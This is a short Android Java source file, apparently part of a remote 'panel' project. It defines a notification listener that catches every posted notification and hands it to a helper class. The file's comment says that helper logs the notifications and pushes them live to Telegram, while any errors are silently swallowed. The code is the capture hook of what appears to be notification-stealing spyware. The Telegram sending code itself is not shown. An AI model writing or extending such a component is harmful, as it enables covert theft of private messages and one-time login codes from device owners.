package com.java.panel;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

/**
 * Enhanced NotificationListenerService.
 * Forwards every posted notification to NotificationHelper
 * which handles filtering, logging and live Telegram push.
 */
public class NotificationService extends NotificationListenerService {

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            NotificationHelper.onNotificationPosted(sbn);
        } catch (Exception ignored) {}
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // optional
    }
}
